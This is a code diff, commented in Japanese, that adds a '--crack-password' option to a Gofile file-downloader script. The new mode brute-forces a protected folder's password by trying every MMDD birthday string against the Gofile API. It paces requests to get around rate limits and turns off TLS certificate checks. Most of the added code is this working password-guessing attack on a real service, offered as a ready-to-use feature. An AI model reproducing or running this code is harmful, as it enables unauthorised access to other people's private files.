@@ -57,7 +57,7 @@ def setup_logger():
 # defaults to 3 download at time
 class Main:
     def __init__(
-        self, url: str, password: str | None = None, max_workers: int = 3
+        self, url: str, password: str | None = None, max_workers: int = 3, crack_password: bool = False
     ) -> None:
         root_dir_str: str | None = os.getenv("GF_DOWNLOADDIR")
 
@@ -75,6 +75,9 @@ class Main:
         self._password: str | None = password
         self._lock: threading.Lock = threading.Lock()
         self._max_workers: int = max_workers
+
+        self._crack_password_mode: bool = crack_password
+        self._found_password: Optional[str] = None
 
         # 停止フラグのインスタンス化
         self._stop_event: threading.Event = threading.Event()
@@ -94,7 +97,30 @@ class Main:
     def run(self) -> None:
         """
         ダウンロード処理を実行します。
+        パスワードクラックモードが有効な場合は、先にクラック処理を行います。
         """
+        # パスワードクラックモード処理
+        if self._crack_password_mode:
+            logger.info("Password crack mode enabled. Attempting to crack password...")
+        
+            # URLからcontent_idを抽出
+            try:
+                content_id = self._url_or_file.split("/")[-1]
+            except IndexError:
+                logger.error("Could not extract content ID from URL.")
+                return
+            
+            # パスワードクラック実行
+            cracked_password = self._crack_password(content_id)
+            
+            if cracked_password:
+                logger.info(f"Password found: {cracked_password}")
+                self._password = cracked_password
+                self._found_password = cracked_password
+            else:
+                logger.error("Failed to crack password. Exiting.")
+                return
+
         logger.info(f"Starting, please wait...")
 
         # APIの不調によるリスト取得漏れを防ぐため、自動的に2周実行する
@@ -1035,6 +1061,148 @@ class Main:
         self._recursive_files_index: int = 0
         self._files_info.clear()
 
+    def _is_valid_date(self, month_day: str) -> bool:
+        """
+        MMDD形式の文字列が有効な日付か判定します。
+        例えば、"0230" は無効、"0229" は有効（閏年対応）です。
+
+        :param month_day: "MMDD" 形式の4桁文字列
+        :return: 有効な日付の場合: True、無効な日付の場合: False
+        """
+        try:
+            month = int(month_day[:2])
+            day = int(month_day[2:])
+        except (ValueError, IndexError):
+            return False
+        
+        # 月の妥当性チェック
+        if month < 1 or month > 12:
+            return False
+        
+        # 月別の日数（閏年対応）
+        days_in_month = {
+            1: 31, 2: 29, 3: 31, 4: 30, 5: 31, 6: 30,
+            7: 31, 8: 31, 9: 30, 10: 31, 11: 30, 12: 31
+        }
+        
+        # 日の妥当性チェック
+        if day < 1 or day > days_in_month[month]:
+            return False
+        
+        return True
+
+    def _generate_valid_dates(self) -> list[str]:
+        """
+        有効な誕生日（MMDD形式）を全て生成します。
+        
+        :return: 有効な日付を昇順で格納したリスト（約366パターン）
+        """
+        valid_dates = []
+        
+        for month in range(1, 13):
+            for day in range(1, 32):
+                month_day = f"{month:02d}{day:02d}"
+                if self._is_valid_date(month_day):
+                    valid_dates.append(month_day)
+        
+        logger.info(f"Generated {len(valid_dates)} valid birth date patterns to test.")
+        return valid_dates
+
+    def _verify_password(self, folder_id: str, password: str) -> bool:
+        """
+        特定のパスワードがGofile APIで有効か検証します。
+        
+        :param folder_id: GofileのフォルダID
+        :param password: 試行するパスワード（MMDD形式）
+        :return: パスワードが正しい場合: True、誤りの場合: False
+        """
+        # クールタイムを挿入（API制限回避）
+        time.sleep(0.2)
+        
+        # ハッシュ化されたパスワードを生成
+        hashed_password = hashlib.sha256(password.encode()).hexdigest()
+        
+        url = f"https://api.gofile.io/contents/{folder_id}?cache=true&password={hashed_password}"
+        
+        user_agent = os.getenv("GF_USERAGENT")
+        headers = {
+            "User-Agent": user_agent if user_agent else "Mozilla/5.0",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept": "*/*",
+            "Connection": "keep-alive",
+            "Authorization": f"Bearer {self._token}",
+            "x-website-token": "4fd6sg89d7s6",
+        }
+        
+        try:
+            response = requests.get(url, headers=headers, timeout=50, verify=False)
+            response.raise_for_status()
+            
+            response_data = response.json()
+            
+            # ステータスが "ok" かつ、パスワード関連のエラーがない場合は成功
+            if response_data.get("status") == "ok":
+                data = response_data.get("data", {})
+                
+                # パスワード保護されている場合、passwordStatus をチェック
+                if "password" in data:
+                    password_status = data.get("passwordStatus")
+                    if password_status == "passwordOk":
+                        logger.debug(f"Password verified: {password}")
+                        return True
+                    else:
+                        return False
+                else:
+                    # パスワード保護されていない場合も成功とみなす
+                    return True
+            
+            return False
+        
+        except requests.exceptions.RequestException as e:
+            logger.debug(f"Network error while verifying password {password}: {e}")
+            return False
+        except Exception as e:
+            logger.debug(f"Unexpected error while verifying password {password}: {e}")
+            return False
+
+    def _crack_password(self, folder_id: str) -> Optional[str]:
+        """
+        有効な誕生日をブルートフォースアタックで試行し、パスワードを特定します。
+        
+        :param folder_id: GofileのフォルダID
+        :return: 見つかったパスワード（MMDD形式）、見つからなかった場合は None
+        """
+        logger.info("[PASSWORD CRACK] Starting brute force attack with valid birth dates...")
+        
+        valid_dates = self._generate_valid_dates()
+        total_attempts = len(valid_dates)
+        
+        try:
+            for attempt_num, password in enumerate(valid_dates, 1):
+                # ユーザー割り込みチェック
+                if self._stop_event.is_set():
+                    logger.warning("[PASSWORD CRACK] Attack interrupted by user.")
+                    return None
+                
+                # 進捗表示（100パターンごと、またはマイルストーン）
+                if attempt_num % 50 == 0 or attempt_num == 1:
+                    logger.info(f"[PASSWORD CRACK] Progress: {attempt_num}/{total_attempts} attempts")
+                
+                logger.debug(f"[PASSWORD CRACK] Trying password: {password} ({attempt_num}/{total_attempts})")
+                
+                # パスワード検証
+                if self._verify_password(folder_id, password):
+                    logger.info(f"[PASSWORD CRACK SUCCESS] Found password: {password}")
+                    return password
+            
+            # 全パターン試行完了
+            logger.error(f"[PASSWORD CRACK FAILED] Could not find password after trying all {total_attempts} valid dates.")
+            return None
+        
+        except KeyboardInterrupt:
+            logger.warning("[PASSWORD CRACK] Attack interrupted by user (Ctrl+C).")
+            return None
+
 
 if __name__ == "__main__":
     try:
@@ -1042,6 +1210,7 @@ if __name__ == "__main__":
 
         url: str | None = None
         password: str | None = None
+        crack_password: bool = False
         argc: int = len(sys.argv)
 
         # 引数なしの処理
@@ -1063,18 +1232,29 @@ if __name__ == "__main__":
             url = sys.argv[1]
         elif argc == 3:
             url = sys.argv[1]
-            password = sys.argv[2]
+            arg3 = sys.argv[2]
+            
+            # 3番目の引数が --crack-password フラグか、パスワードかを判定
+            if arg3 == "--crack-password":
+                crack_password = True
+            else:
+                password = arg3
         else:
             logger.info(
                 f"Usage:\n"
                 f"python gofile-downloader.py https://gofile.io/d/contentid\n"
                 f"python gofile-downloader.py https://gofile.io/d/contentid password\n"
+                f"python gofile-downloader.py https://gofile.io/d/contentid --crack-password\n"
                 f"python gofile-downloader.py /path/to/links.txt\n"
             )
             sys.exit(-1)
 
         if url:
-            downloader = Main(url=url, password=password)
+            downloader = Main(
+                url=url,
+                password=password,
+                crack_password=crack_password
+                )
             downloader.run()
 
     except KeyboardInterrupt:
